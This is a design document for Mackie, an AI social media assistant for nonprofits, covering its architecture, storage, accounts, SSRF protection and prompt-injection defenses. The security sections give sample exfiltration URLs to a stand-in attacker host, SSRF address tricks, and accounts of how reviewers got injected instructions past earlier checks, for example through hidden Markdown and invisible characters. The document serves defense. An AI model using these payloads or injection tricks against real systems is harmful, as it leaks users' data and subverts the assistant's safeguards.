# Mackie — Design Doc

## What It Is

Mackie is a conversational AI social media manager for nonprofit marketing staff, modelled on Vee's Maggie. Its job is Maggie's three steps:

- **Plan:** a dated monthly calendar tied to the org's campaigns, events and relevant awareness days.
- **Create:** on-brand posts for LinkedIn, Instagram and Facebook, and supporter email, each with an idea for the visual.
- **Optimize:** record how posts performed and suggest what to post next from what worked.

Two traits run through all three: Mackie is **proactive** (Vee: Maggie "doesn't wait for prompts"), and **nothing goes live without approval** ("Nothing goes live until you review and approve it"). It researches the org first, learns from feedback (corrections in the user's own words, approved posts, pasted posts) and remembers it across sessions. Every suggestion and draft goes into a post ledger with a status.

**Scope versus Maggie.** Maggie also publishes, generates graphics, pulls analytics and advises on paid ads. Each of those needs platform accounts and API access (OAuth per org, analytics APIs, an image model with moderation), so Mackie stops at the draft: it describes the visual, and the user reports results in chat. The Roadmap lists the next steps.

**Goals**

- Content is grounded in research, and every suggestion names its source.
- Corrections stick within the session and across sessions.
- A non-engineer can add a platform, content type or format, and view or edit what Mackie learned, without a code change or a redeploy.
- Switching LLM providers is a configuration change.
- Each conversation's history is isolated.

**First run.** The user gives the org's name and, optionally, its website, and confirms them. The first content request triggers `research_org` (see Research), which ends in a short cited **org brief** that stays in the prompt in every future session. Corrections ("too corporate, we're more grassroots") are saved with `save_preference` and appear in the prompt from the next turn on.

---

## Architecture

```
User ──► login ──► app.py (Chainlit web UI)  or  main.py (terminal)
              │  accounts.open_org: only orgs the user belongs to (agent/accounts.py)
              ▼
         Assistant (agent/assistant.py)
              │  system prompt rebuilt every turn from the org's memory and skills/:
              │    stable block   — identity, org brief, sources, pillars, platforms, content types, formats, rules
              │    per-turn block — date, preferences, voice examples, recent ledger, agenda, best-performing posts, summary
              ▼
         LangGraph (agent/graph.py) — AgentState checkpointed in PostgreSQL per thread_id
              │  summarize → agent ⇄ tools   (tools → summarize → agent)
              │  agent → save_check → summarize → agent   (at most once per turn)
              │  model sees at most 40 messages / ~12,000 tokens, starting at a user turn,
              │  old tool results shortened; older messages are summarized in batches of 10
              ▼
         LiteLLM ──► main provider, then fallbacks (agent/config.py)
              │
              └─ 12 tools (agent/tools.py):
                   research_org, refresh_research, web_search      → agent/research.py
                   save_post, update_post_status, search_ledger,
                   show_post, record_performance, save_preference,
                   forget_preference, save_voice_example           → agent/memory.py
                   generate_calendar                               → 4 parallel LLM calls

Storage:  PostgreSQL (agent/db.py, migrations/), row-level security per org on every org table (not memberships):
            orgs, posts, preferences, voice_examples   org memory: research, brief, preferences, voice, ledger
            tool_calls                                 one row per tool call
            checkpoints, checkpoint_blobs/_writes      conversation history, keyed by thread_id
            users, memberships                         accounts and which orgs each may open
Errors:   agent/errors.py (what users are told), agent/logs.py (log setup, redaction)
Config:   skills/*.yaml                         platforms, content types, formats, content pillars
```

Each user message runs the loop until the model replies without calling a tool. If that reply shows post ids that were never saved, `save_check` sends one follow-up (see Checks enforced in code). Text streams token by token; each tool call appears as a step in the web UI when it finishes.

---

## Decisions

### LLM access: LiteLLM behind one provider registry

**What.**

- Every LLM call goes through `litellm.acompletion()`. `agent/config.py` holds a registry (`PROVIDERS`) of ten named providers, plus a `custom` entry that accepts any LiteLLM model string. The ten are Anthropic, OpenAI, xAI, Google, Mistral, Groq, DeepSeek, OpenRouter, OpenCode Zen and self-hosted Qwen on vLLM.
- A provider is configured when its required variables are set (to anything, so `.env.example` leaves every key blank). The first configured provider in registry order is the main model, or the one named by `LLM_PROVIDER`. A bare model name gets the provider's LiteLLM prefix (`grok-3-mini` becomes `xai/grok-3-mini`), since LiteLLM can't route some bare names on its own.
- `connection_kwargs(model)` supplies `api_base` and `api_key` for OpenAI-compatible endpoints. A model that isn't a provider's configured model is matched by prefix; `openai/` belongs to both OpenAI and OpenCode Zen, so `FAST_PROVIDER` and `JUDGE_PROVIDER` name the provider for those models. Without one, an `openai/…` model goes to OpenAI, the one higher in the registry, and a warning says so.

**Why.** Swapping models must not need code changes, and nonprofits may need free or self-hosted models. The alternative, provider SDKs called directly in each module, spreads provider logic everywhere. Adding a provider is one registry entry. The provider of a role model is looked up from the model string inside `connection_kwargs`, rather than passed with each call, so every call site stays unchanged; the cost is in the Roadmap (Role models).

**Reasoning models.** Background calls (summary, org brief, calendar, eval judge) use `background_kwargs(model)`, which turns reasoning down for providers that need it:

- OpenCode Zen gets `reasoning_effort="low"`. Its brief needed 2,112 thinking tokens at the default effort and 59 at low.
- Qwen 3 has thinking switched off. Without that, it never finished the brief.

**LiteLLM is at least 1.105.0, and 1.106.0 is excluded.** Older releases have published security advisories. 1.106.0: on every call with `tools` it imports MCP gateway code that needs `mcp>=2.2`, while Chainlit pins `mcp<2`, so every chat turn failed with every provider. The offline tests mock `acompletion`, so `tests/test_deploy.py` makes one real offline tool call (`mock_response`) against the installed LiteLLM.

**OpenCode Zen free models.** As of October 2026, every free model refuses clients other than the OpenCode app, so the default is `glm-5.3-flash`: the cheapest paid model on the Chat Completions endpoint, about $0.0015 for a typical turn (8K tokens in, 600 out, at $0.15 and $0.50 per million), less than `deepseek-v4.1-flash` and `minimax-m3`. Cheaper models on Zen's Anthropic and Responses endpoints (Haiku 5.5, `gpt-5-nano`) would need a second route; Haiku is already the Anthropic provider's default. Verified live in October 2026: streamed tool calls, a tool-result round trip, `reasoning_effort="low"` on background calls, and a full Mackie turn that saved a preference.

Token limits on those calls are ceilings, not targets. User-facing replies keep full reasoning. If a reply has neither text nor a tool call, it is retried once with reasoning turned down, and then a short message is shown instead of a blank reply.

### Timeouts

**What.**

- **LLM calls:** `connection_kwargs()` adds `timeout=LLM_TIMEOUT_S` (120 s) to every call, so `background_kwargs()` callers get it too. For a streamed reply it bounds the wait for each chunk, not the whole answer.
- **Web:** a Tavily search gets `FETCH_TIMEOUT_S` (15 s), and so does a whole page fetch, DNS lookups and redirects included: httpx's own timeout bounds each wait for data, so a server sending a byte every few seconds held a fetch open for good. A page is read up to `MAX_PAGE_BYTES` (2 MB), as only 4,000 characters of its text are kept, and Mackie unpacks a compressed page itself (gzip or deflate, one layer), stopping at that size, at the end of the compressed stream, or after that many bytes received: httpx unpacks each chunk whole, so 2 KB of nested gzip from a hostile site became 1 GB in memory, and bytes sent after a tiny gzip stream piled up inside the unpacker. An unknown encoding ("none") is read as plain text, as httpx did.
- **Turns:** a turn may take at most `MAX_TOOL_ROUNDS` (25) tool rounds. LangGraph's default limit is 10,000 steps, each tool round a paid model call, so a model stuck calling tools would have run up thousands; the user is told to ask for less at once. A message may be at most `MAX_MESSAGE_CHARS` (20,000 characters, about 5,000 tokens), refused before it is stored, so one paste can't fill every later turn's history.
- **Database:** see Memory (Nothing waits forever).

**Why.** Without it, a provider that accepted a request and then stalled left the chat on "thinking" forever, and fallback never started, since fallback only runs when a request fails. Putting the timeout in the shared kwargs covers every current and future call site.

**Trade-off.** LiteLLM's `num_retries` also retries timeouts, so each retry can wait another 120 s. A chat reply therefore retries once on a model that has a fallback after it, so a dead provider hands over after two timeouts, not four. The last model keeps 3 retries, since nothing comes after it, and so do the summary and the org brief (`BACKGROUND_RETRIES`), which have no fallback.

### Provider fallback and cost routing

**What.** `resolve_fallbacks()` lists the models of every other configured provider. `_open_stream()` tries them in order when a request fails to *start* (outage, rate limit, bad key). An error after tokens have streamed is not retried, because part of the reply is already on screen. `FAST_MODEL` routes background work to a cheaper model. `JUDGE_MODEL` picks the eval judge.

**Why.** A second API key is enough to survive one provider's outage. LiteLLM's `Router` was the alternative, but it would send Anthropic-format system blocks to other providers. `_system_content()` builds the system message per model instead.

### Agent loop: LangGraph with PostgreSQL checkpoints

**What.** A four-node `StateGraph` (`summarize`, `agent`, `tools`, `save_check`), checkpointed by `OrgCheckpointer`, LangGraph's `AsyncPostgresSaver` limited to one org's threads.

**Why.** History survives restarts, and typed state with an explicit router (`should_continue`) stays easy to debug. LangChain's AgentExecutor was rejected because it hides its retries and callbacks.

**Session isolation.**

- **Web UI:** each user has one resumable conversation per org, the thread `{org_id}:web-user-{user_id}`, named on the server; the browser never names a thread. A thread per browser tab would lose the conversation on every refresh, although it was still stored.
  - A returning user sees the last six messages again, each cut to 1,500 characters, with a note if the last one never got a reply, and a **Start a new conversation** action (`Assistant.recent_exchanges`, `clear_history`). If the recap can't be loaded, the session starts with the plain greeting.
  - A turn that fails because the conversation is too long for the model gets the same action right under the error, since every later turn would fail too.
  - Two tabs on one thread take turns (`_thread_lock`, per process).
  - Editing a sent message is off (`edit_message` in `.chainlit/config.toml`): Chainlit would rerun the turn, but the stored conversation would still hold the original message and its reply.
  - A `:` can't occur in an org id, so a user's thread can never equal another org's default thread (the bare org id, used when no thread is given).
- **CLI:** resumes the thread `{org_id}:cli-user-{user_id}`, one per user and org, so two people using the terminal for one org don't share a conversation. Its `reset` command deletes that thread's checkpoints (`Assistant.clear_history()`); org memory is kept.
- **Ownership:** `Assistant` refuses a thread that doesn't start with its org id, and row-level security on the checkpoint tables compares the org part of every thread id with the connection's org.
  - `OrgCheckpointer` sets its org on every cursor it opens, by overriding the saver's `_cursor()`; in pipeline mode that costs no extra round trip.
  - It never assumes a connection still has an org from earlier: an audit found that remembering it let a failed checkpoint write (whose transaction rolled the setting back) leave the connection on the previous org, so the next org's cursor could read that org's thread.
  - `_cursor()` is a private method, so a LangGraph upgrade could change it; the failure would be closed, not open (no org set, no rows), and `test_graph.py` and `test_security.py` check both directions.

**Concurrency.** Turns share one connection pool per process and hold a connection only for each query, not while the model is answering, so a pool of 10 serves many simultaneous chats. Mackie can run as many processes and servers as needed: PostgreSQL is the only shared state for org memory (the per-thread turn lock is per process; see the README's Known Limitations). Measured with a mocked model: 400 simultaneous sessions, no errors, each reply in its own session.

### Context management

**What.**

- **Ledger:** the prompt lists the 20 most recent posts. Older ones are reachable with `search_ledger`.
- **Messages:** the model sees at most the last 40 messages and about 12,000 tokens of them (estimated at 4 characters a token, since no one tokenizer fits every provider), starting at a user message (`_window_start()`). A plain slice can start on a tool result whose tool call was cut off, and providers reject that. If the current turn alone is bigger, it is kept whole. Counting only messages let forty messages carrying research results cost several times what forty chat messages did.
- **Old tool results:** results from before the last two user turns are cut to 600 characters with a note that the full result is earlier (`_shorten_old_tool_results`); the stored history keeps them whole. A research result from twenty turns ago was re-sent in full every turn, and was most of a long conversation's tokens.
- **Running summary:** messages that leave the window are folded into the summary in batches of ten (`summarize` node), one LLM call per batch instead of one per turn; until a batch is complete they stay in the model's view (`_view_start()`), so nothing falls between the summary and the window. The summary has two parts: **Open requests and dates** (what the user asked for that isn't done, follow-ups Mackie promised, deadlines and events, carried forward until done) and a **Summary** of 300 words or less. A separate section keeps a date mentioned once from being squeezed out as later rewrites shorten the summary; each item must carry its date, since a live run kept "remind me before the gala" there and left the date in the Summary. It goes into the per-turn prompt block. If the call fails, the turn continues and the same messages are retried next turn; until then that batch is out of the model's view, rather than the view growing without limit while a summarizer is down.
- **Full history:** stays in the checkpoint; no message is deleted. Each checkpoint is a full snapshot of the conversation and a turn writes several, so keeping them all grew a thread quadratically (431 MB after 400 turns, measured). After each turn `prune_history()` keeps only the thread's newest checkpoint: 2.7 MB after 400 turns. The cost is LangGraph's time travel (replaying from an earlier step), which Mackie doesn't use.

**Why.** Without the summary, anything that lived only in old messages was lost, such as the scraped research, which exists only in tool results. Durable facts don't depend on the window at all: the org brief, preferences and ledger are in the database and rebuilt into every prompt.

**Trade-offs.** The summary is still lossy, and the token count is an estimate: measured with a real tokenizer, 4 characters a token is close for English and research text (3.9–4.5) but undercounts JSON tool arguments (about 2.9), emoji- and hashtag-heavy posts (about 2.3) and non-Latin text such as Greek (2.9, or worse on some tokenizers), so the window can hold up to about twice as many real tokens. That costs more, not correctness, on models with large contexts; a test bounds a realistic mix at 1.5 times the budget. Up to ten messages beyond the window can be in view while a batch fills. A vector store (pgvector, in the same database) for retrieving old turns word for word is the next step if that matters.

### Prompt caching (Anthropic only)

**What.** The system prompt is two blocks:

- **Stable:** identity, org brief, sources, pillars, skills and rules. It changes only when research or skill files change.
- **Per-turn:** date, preferences, voice examples, ledger, agenda, best-performing posts and summary. It changes almost every turn.

For Anthropic models the stable block carries `cache_control`. Other providers get one plain string.

**Why.** The ledger changes on almost every turn, so caching the whole prompt would invalidate the cache constantly.

**Caveat.** Claude Haiku 4.5, the previous default, cached only prefixes of 4,096 tokens or more; the minimum for Haiku 5.5, the current default, has not been checked. Tools plus the stable block come to about 5,600 tokens before any org brief (measured with an OpenAI tokenizer; Claude's count differs somewhat), so they clear Haiku 4.5's minimum. The savings have not been measured; check `usage.cache_read_input_tokens`.

### Org brief

**What.** After research, one `FAST_MODEL` call condenses the results into a brief of 350 words or less (mission, programs, news, audiences, facts), with the source URL after each fact. It is stored as `org_brief` and shown in the stable prompt block.

**Why.** Raw research reaches the model once, as a tool result. Without the brief, a new session could answer "what programs do we run?" only from source titles.

If the brief call fails, research is still saved with an empty brief.

### Research: Tavily and httpx with BeautifulSoup

**What.**

- `research_org()` runs `scrape_site()` and three Tavily searches in parallel (social presence, recent news, similar orgs).
- `scrape_site()` reads the homepage, then fetches in parallel up to three same-site pages whose path suggests About, Programs, Events and similar. Each page is labelled with its URL, so it can be cited.
- Mid-conversation `web_search` results (at most 10 per call) are added to the research sources, up to 100 in all. Only pages that were actually read become sources; a homepage that failed or was blocked does not.
- A homepage or search that fails gives no text (the reason goes to the log), and the research says plainly that there is no website text. An error's own text used to be stored as the website's content, where the brief, the calendar and the screen repeated it.
- Research reads only the website stored for the org, and only the user sets it (see Prompt-injection defense). With none, it works from the searches alone.

**Why.**

- Tavily returns structured results and has an async client, so the searches run in parallel; the unofficial DuckDuckGo API has no async client and rate-limits. Tavily's free tier is 1,000 searches a month.
- httpx is async; BeautifulSoup drops scripts, navigation and footers.

**Limitation.** Pages rendered by JavaScript yield little text; supporting them would mean a headless browser such as Playwright.

### SSRF protection

**What.** `_fetch_html()` never lets httpx follow redirects. It follows up to five hops itself and checks every hop twice:

1. **`_is_safe_url()`** checks the URL as written. It blocks:
   - non-HTTP(S) schemes;
   - metadata hostnames, `localhost` and `*.localhost`;
   - any IP literal that isn't a public unicast address (`not is_global`), which covers loopback, private, link-local, unspecified and carrier-grade NAT (100.64.0.0/10, including Alibaba Cloud's metadata endpoint);
   - IPv6 addresses that carry an IPv4 address, judged by that address: IPv4-mapped (`::ffff:127.0.0.1`), NAT64 (`64:ff9b::a9fe:a9fe` reaches 169.254.169.254 through a NAT64 gateway, yet Python counts it as global) and IPv4-compatible (`::127.0.0.1`); the local-use NAT64 prefix `64:ff9b:1::/48` is always refused;
   - hex, decimal, octal and short IP forms;
   - hosts disguised with percent-encoding (`%31%32%37.0.0.1`) or fullwidth digits, which are decoded and NFKC-normalised first.
2. **`_resolves_to_internal()`** resolves the hostname and blocks it if *any* address is internal, so a public-looking domain pointing at `127.0.0.1` is refused.

**Remaining gap.** httpx resolves the name again when it connects, so a DNS server that answers differently the second time (DNS rebinding) is not caught. The fix is to pin the connection to the checked address.

### Prompt-injection defense

**What.** Text from third parties is wrapped by `wrap_untrusted()` (`agent/untrusted.py`):

- website text and search snippets in `<external_content>`;
- the org brief in `<org_brief>`;
- the conversation summary in `<conversation_summary>`.

The wrapper escapes any copy of its own tag inside the text, so a page containing `</external_content>` can't close the wrapper and pass the rest of its text off as instructions. It also HTML-escapes attribute values. The stable prompt ends with a Security Policy telling the model to treat tagged content as data. The writers of the brief and the summary are told the same. The research sources in every prompt are wrapped too, titles cut to 120 characters: a page title is third-party text, saved with the research, so an injected title would otherwise be in every later prompt.

Wrapping can't stop a model that is fooled anyway, so the ways out for an org's data are closed where they can be:

- **Fetches:** `research_org` and `refresh_research` read only the website stored for the org; a different `org_url` from the model is refused. The check judges the URL exactly as it will be fetched (`research.with_scheme` first): to `urlparse` alone, `evil.example://org.example/` is on `org.example`, but research fetched `https://evil.example://…`. A page on the org's site is read without the query string the model gave it, which could carry data out through a redirect on that site. Otherwise an injected page could have the model research `https://attacker.example/?d=<the org's drafts>`, sending the data out and replacing the research with the attacker's page. Only the user sets the website: typed at onboarding (where `research.website_url` takes only something shaped like a website, so "Feed the Children, Inc." isn't split into a name and the website "Inc."), which fills a missing one, or changed by export and import. Before this, research saved the model's `org_url` as the website when none was stored, so one injected page could make itself the org's website for good.
- **Images and media:** replies render as Markdown, so `![](https://attacker.example/?d=…)` in a reply would send data out as soon as the browser showed it. Every page carries a Content-Security-Policy that loads images, video and audio only from Mackie and allows no plugins or frames (`app.MEDIA_POLICY`, set by `app.restrict_media`). An image rule alone wasn't enough: Chainlit shows an image link ending in `.mp4` as a video, which a review got past it in a real browser. Links still render, but need a click.

**Standing memory comes from the user.** Preferences, voice examples and approved posts are in every later prompt, so an injected instruction saved there would outlast the page that planted it. Each tool call gets a `tools.Turn`, built by the graph from the conversation: what the user typed, the posts Mackie displayed to them (`show_post`) before their last message, and which posts were saved since. Words are compared ignoring case, spacing, punctuation and emoji, which models change when copying, with accents and other combining marks kept in their words (Hindi or Thai would otherwise fall apart into letters, and any text would pass). Scripts written without spaces (Chinese, Japanese, Thai) are compared by runs of characters, since a "word" there is a whole clause.

- A preference's `quote` must be words the user typed, its `value` may use only words the user typed (plus "and", "the" and other words that can't carry an instruction or an address), and its key is a label (`[a-z0-9_]`) of the user's words or the usual ones (`voice`, `banned_topics`, platform names). An earlier version checked only the quote, so a fooled model quoted "yes" and saved any instruction, and then only the key's characters, so `always_link_evil_example` passed. `forget_preference` needs the user to have used one of the preference's words (its key's, or its value's, so a user writing in another language can name it), so a page can't delete their banned topics.
- A voice example must be a post (five words or more, or 15 characters in a script written without spaces) the user pasted or typed, labelled "pasted by user" by the code: the model's own label was shown beside it in every prompt. Other examples come from approvals, and only the user makes a post live: `save_post` takes `approved` or `posted` only for text the user typed, and `update_post_status` takes them only for a post Mackie itself displayed to the user (`show_post`) before their message, unchanged since but for its status, or that they typed.
- **Why Mackie's own display, not the model's reply.** Each weaker version was got past in review: "saved before their message" let a fooled model approve a draft it never showed; its id in a reply let it name the draft without showing it; and checking the reply's text let it hide the post in Markdown the page doesn't display. Regexes for that were got past seven ways, a CommonMark parser of the replies (the standard the web UI follows) five more, each a difference between it and Chainlit's renderer (footnotes, directives, alert blocks, replies streamed into one message, how a change to one paragraph reparses the rest). So the check no longer reads the model's Markdown: `show_post`'s result is a tool result, which the model can't forge, and the UIs display it as `tools.post_display` writes it, with every punctuation mark escaped, so no link, comment, HTML or directive can hide a character. Post text with characters readers can't see is refused when saved, and an imported post with one can't be approved: controls (a bare `\r` moved text out of the display; an ESC code concealed it in the terminal, which also strips controls from every reply), format characters, line separators, unassigned code points and the other default-ignorable ones (variation selectors after an emoji spelled out a hidden instruction). Joiners are allowed between non-ASCII characters and an emoji's style selector after a symbol, where they show. A resumed web session shows the displays again in its recap. The model calls `show_post` after saving a draft instead of copying it out, so the user sees each draft once, as stored. The platform rules apply to approving; a post marked `posted` already went out as it was.
- `record_performance` records results only for a post the user named (its id or a word of its title) or was shown, never one saved since their last message, and its note uses the user's words: the results section of every prompt tells the model to build on the best performers.
- Titles, pillars, platforms and results notes are capped when saved (120, 80, 40 and 500 characters), every text field must be text, and cut again in the prompt, since a hand-edited import isn't capped: twenty long titles once filled every prompt past the context window, which "start a new conversation" didn't fix.

**Limitation.** It still depends on the model obeying its system prompt within those limits: a value made of the user's own words can still be a preference they didn't mean. Since every preference is in every prompt, their size is capped:

- the key at 60 characters, the value and the quote at 500 each (the longest real one so far is 145): an injected essay or a pasted document is refused with a message asking for a sentence or two;
- a list built with `append` at 1,000 characters in all, since a live run saved a refused 641-character style guide in two appended parts;
- all preferences together, with the quotes the prompt shows beside them, at 4,000 characters (about 1,000 tokens), since another live run split the text across `style_guide` and `style_guide_2`.

The caps are checked inside the transaction that saves, with the org locked, so saves in parallel sessions can't pass them together. Only a save that adds length is refused, so shortening or replacing a preference always works. Having the user confirm each new preference is the next step.

### Memory: PostgreSQL

**What.** Each org's memory is rows in PostgreSQL (`migrations/001_initial.sql`): `orgs` (name, website, research, brief, pillars, the post-number counter), `posts` (status, platform, content, `created_at`, performance, and the optional fields that vary by format in a `details` JSON column), `preferences` (value, the user's quote, when it was learned), `voice_examples` and `tool_calls`. `memory.load_profile()` assembles them into one profile dict, from one read-only snapshot; the prompt, the tools and the export/import scripts all use it:

```json
{
  "name": "Org Name", "website": "https://…",
  "research": { "sources": [ … ], … }, "org_brief": "- Mission: … (https://…)",
  "preferences": { "voice": "warm and grassroots", "banned_topics": ["politics"] },
  "preference_notes": { "voice": { "learned_at": "…", "quote": "Too corporate, we're more warm and grassroots" } },
  "voice_examples": [ { "content": "…", "source": "approved post_004", "added_at": "…" } ],
  "post_ledger": [ { "id": "post_002", "title": "Volunteer spotlight", "platform": "instagram",
                     "status": "posted", "format": "carousel", "visual": "Ana at the pantry",
                     "pillar": "Community Impact", "parent_id": "post_001", "source_url": "https://…",
                     "created_at": "…", "performance": { "reactions": 240, "shares": 30, "recorded_at": "…" } } ]
}
```

**Why.** JSON files on disk worked on one machine only: the `flock` lock didn't reach other servers or native Windows, and SQLite history allowed one process. PostgreSQL gives transactions, row locks and row-level security, and LangGraph has an official saver for it. A document store would have meant giving up joins and multi-row transactions. The driver is psycopg 3 (async, with a pool), with no ORM: the queries are few and plain, and SQLAlchemy plus Alembic would add more than they save. Migrations are numbered SQL files applied in order by `db.migrate()` and recorded in `schema_migrations`.

**Org isolation, in the database.**

- **Row-level security:** every org table, the checkpoint tables included, has a policy that shows and accepts only rows whose org matches the transaction's `app.org_id` setting. It is `FORCE`d, so it applies to the tables' owner too. `db.org_transaction(org_id)` sets the org for one transaction, so a query that forgot its `WHERE org_id` still can't reach another org. With no org set, no org rows are visible. A test lists every table and fails if a new one has org rows but no forced policy.
- **Two roles:** migrations run as the schema's owner (`MACKIE_MIGRATION_URL`); Mackie connects as a role that may only read and write rows (`MACKIE_DATABASE_URL`). It can't change tables or policies, switch row-level security off, or rewrite the migration records. Mackie refuses to start as a superuser or a role with `BYPASSRLS`, and `scripts/migrate.py` refuses one role for both.
- **Org ids** are still `slugify()` ids, `[a-z0-9-]` only; `db.check_org_id()` refuses any other before a query runs, and a CHECK constraint does the same in the table. The name is NFKC-normalised ("ﬁsh" is "fish"). A letter or digit of another script than Latin (Greek, Japanese) adds a hash of the name's words, ignoring case, spacing and punctuation (`org-<hash>` when nothing else is left, as before), so "日本 Org" and "中国 Org" are two orgs, not both `org`, and "日本  Org." is the first again. Latin letters other than a–z ("é", "ø", "ß") are separators, as they always were. Stored ids therefore don't change, except for names mixing Latin with another script, which used to collide, and names with compatibility characters such as "ﬁ". A name with no letters or digits in any script ("!!!"), or longer than 100 characters (a pasted paragraph, whose id didn't fit the index and looked like a database outage), gets no id, so the UIs ask again.
- **Queries** are parameterized throughout; the user's search text is matched with `strpos`, not `LIKE`, so `%` and `_` are literal.

**Concurrent writers.** Every read-change-write locks the org's row first (`SELECT … FOR UPDATE`), so sessions, the CLI and scripts on any number of servers take turns per org and never overwrite each other. A status change locks just the post's row, so of two sessions approving one post at once only the first adds it to the voice examples. Post ids come from a per-org counter under the org lock, so a deleted post's id is never reused. Research saves only the research and brief after its slow calls, so posts saved meanwhile survive. No transaction waits on the model.

**Nothing waits forever.** Every connection has a connect timeout (10 s), `statement_timeout` (30 s), `lock_timeout` (10 s) and `idle_in_transaction_session_timeout` (60 s); waiting for a free pooled connection gives up after 30 s. A migration's connection has the connect timeout and waits at most 60 s for a lock (another migration's included), with no statement timeout, as changing a large table can take a while.

**Failures.** After a database restart or failover every pooled connection is dead. The first request that hits one fails, and the pool then checks all its idle connections and replaces the dead ones, so one request fails rather than one per pooled connection; checking on every checkout would cost a round trip per transaction. Users see "Mackie can't reach its database right now": the driver's own message names the host and port, so it goes to the log. The same holds for every error that ends a turn (`agent/errors.py`): a provider failure gets a sentence saying what happened and what to do (too slow, too many requests, the key was refused, the conversation is too long, the model is unknown), and anything else a generic one pointing to the log. An audit found a refused API key reaching the screen as the provider's raw JSON, class name and all, with "Please try again" as the only advice. A database that is down when someone logs in refuses the login instead of breaking the page. Pruning history is housekeeping, so its failure is logged, not shown.

**Editing by hand.** A non-engineer edits an export: `scripts/export_profile.py` writes the profile dict above as JSON, and `scripts/import_profiles.py` replaces the org's memory with it in one transaction. `memory.read_profile_file()` refuses a file that isn't UTF-8 or valid JSON (with line and column), or holds `NaN` or `Infinity`; `memory.profile_problem()` then checks the contents in plain words: wrong section types, a field the prompt reads as text that isn't text, a `parent_id` that isn't a post id, a post id that isn't `post_N` (digits 0–9 only, as the database's CHECK has it) or is too large, duplicate ids, an unknown status, a `scheduled_for` that isn't `YYYY-MM-DD`, a time that isn't a time; `memory.profile_org_id()` that the file names its org. `scripts/validate.py` and `import_profiles.py --check` run the same checks without importing. A refused file changes nothing; in a batch, the other files are still imported. A post added without an id gets the next one. Exported times carry their UTC offset, so an export imported on a machine in another time zone keeps the same moments; the old `data/` files have no offset and are read in the importing machine's zone. "Today", for the agenda and date searches, is the server's local date, set with `TZ` (`config.load_settings` applies one from `.env`: Python reads `TZ` only when it starts).

**Text the database can't hold.** PostgreSQL text can't contain NUL, which models occasionally send; it is stripped on save rather than failing the save.

**Trade-offs.** A database server is now required, and the tests need one too (a disposable container). Editing what Mackie learned takes an export and an import instead of opening a file.

### Accounts and access

**What.** `agent/accounts.py` keeps users and their org memberships. The web UI uses Chainlit's password login (`CHAINLIT_AUTH_SECRET` signs the session); the terminal asks for the same username and password. A user sees and opens only orgs they belong to; starting a new org makes them its member, and `scripts/users.py grant` adds people to an existing one.

- **Passwords:** scrypt from the standard library (N=2¹⁴, r=8, p=1, a 16-byte random salt per password), compared in constant time, at least 12 characters. Hashing runs in a worker thread so a login doesn't stall other sessions.
- **Guessing:** five wrong passwords in a row lock the account for 15 minutes. Each wrong password is counted in one atomic update, so parallel guesses are all counted, and the password check runs with no database connection held, so a flood of guesses doesn't tie up the pool. An unknown username and a locked account each cost the same hash check as a wrong password, and every refusal looks the same, so neither the answer nor its timing tells which usernames exist (an audit found a locked account answering 25 times faster).
- **Sessions:** the login cookie lasts a day (`user_session_timeout`), and `allow_origins` is empty, so only Mackie's own page can make requests with it. The cookie carries a session key derived from the stored password hash (`User.session_key`), so changing a password ends every session opened with the old one: before, a stolen cookie kept working for up to a day after `passwd`. No schema change was needed, since a new password always has a new hash.
- **Revocation:** `Assistant` checks the user's membership and session key before every message (one indexed query), so revoking access, removing the account or changing the password stops chats that are already open: the next message is refused and the session ends, in the web UI and the terminal. A reply already being written finishes; checking inside every tool call would close that last gap at the cost of a query per call.
- **Default account:** `scripts/migrate.py`, which every deploy runs, makes sure `MACKIE_DEFAULT_USERNAME` (`admin`) exists, so a fresh install always has someone who can log in and add others. The password comes from `MACKIE_DEFAULT_PASSWORD` (required by Docker Compose, and kept out of the app container); a local run without one gets a random password printed once. An existing account is never changed, so a later `passwd` isn't undone by the next deploy.

**Why.** Without accounts, anyone who reached the web UI could open any org. Password login needs no outside service; OAuth would need an app registered per deployment, and Chainlit supports it when that's wanted. scrypt is in Python's standard library, so there is no new dependency.

**Trade-offs.**

- No password reset by email and no single sign-on; an admin runs the script.
- HTTPS, `Secure` cookies and per-address rate limits are left to a reverse proxy (README): the lockout is per account, so it can't slow one password tried against many accounts, and anyone can keep a known account (such as `admin`) locked.
- Any logged-in user can create an org that doesn't exist yet and becomes its member, which keeps onboarding self-service; a misspelled name creates an org. On a server several organizations share, someone could claim an org's name, and set its website, before its team arrives, so `MACKIE_USERS_CREATE_ORGS=false` leaves creating orgs to `scripts/users.py grant`.

### Learning from feedback

**What.**

- `save_preference(key, value, quote, append)` keeps `preferences[key]` a plain value, or a list with `append` (e.g. `banned_topics`). It stores the date and the user's own words in `preference_notes`. Keys can be scoped to a platform, e.g. `linkedin_voice`.
- `forget_preference(key, value?)` removes a key, one item of a list, or a string preference only when the value matches, ignoring case.
- A post becomes a voice example when it is first approved (once, however often it is approved), and so does a post the user pastes. Marking a post `posted`, or reporting its results, doesn't make it one, as the text may have been changed before it went out; a post the user pastes as posted does, being their own text. The newest 5 are kept, and 3 appear in the prompt as "match their voice, not their topics".
- Ideas the user turns down get the status `rejected`.
- Asked "what have you learned about us?", Mackie answers from these sections.

**Why.** Corrections say what not to do; approved and pasted posts show what the org sounds like. Keeping the user's words beside each preference makes it explainable, while `preferences` stays easy to edit by hand.

### Post ledger

**What.** `save_post` requires a platform, the content and a title. It optionally takes a pillar, content type, `format`, `visual`, `parent_id` (the post this is a version of), `scheduled_for`, `source_url` and `source_summary`. The statuses are `suggested`, `draft`, `approved`, `posted`, `planned` and `rejected` (`memory.POST_STATUSES`). Suggestions are shown with their ledger id (`**2. Volunteer spotlight** · post_003`), so "the second one" still resolves after a summary or in a new session. `search_ledger` filters by status, platform, date range and text, and lists titles; `show_post` gives one post in full, so a draft from an earlier conversation is shown before it is approved (a live run approved one it couldn't show). A draft is shown as saved, hashtags included.

**Why.** Users ask "what did we work on this week?", which needs dates and a query beyond the 20 posts in the prompt. Versions link a LinkedIn draft, its rewrite and its Instagram version.

### Checks enforced in code

**What.** `save_post` checks a finished post (status `draft`, `approved` or `posted`) before saving it. Ideas (`suggested`, `planned`) skip the platform rules, and `update_post_status` re-checks the stored text before a post becomes `approved`, so nothing is approved unchecked (a post marked `posted` already went out as it was):

| Problem | Result |
|---|---|
| Longer than the platform's `max_length` | Not saved; the model is told to fix it and save again. |
| Hashtag count outside `hashtag_count` (skipped for a format without a caption, such as a story) | Not saved, same as above. |
| No `visual` on a platform with `needs_visual` (Instagram, Facebook) | Not saved, same as above. |
| A `format` that doesn't exist, or not on this platform (a LinkedIn story, an email feed post) | Not saved, same as above. |
| `parent_id` that isn't in the ledger | Not saved. |
